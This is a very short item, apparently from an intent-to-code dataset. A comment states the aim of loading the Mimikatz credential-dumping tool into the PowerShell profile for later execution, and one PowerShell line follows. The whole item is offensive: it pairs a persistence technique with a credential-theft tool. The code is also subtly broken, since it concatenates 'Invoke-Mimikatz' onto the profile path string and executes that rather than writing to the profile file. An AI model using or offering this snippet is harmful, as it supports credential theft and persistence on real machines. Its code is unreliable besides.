# Natural language intent:
# Attempt to load Mimikatz into the PowerShell profile for future execution.

$profile = $profile + "`n" + "Invoke-Mimikatz"; Invoke-Expression $profile
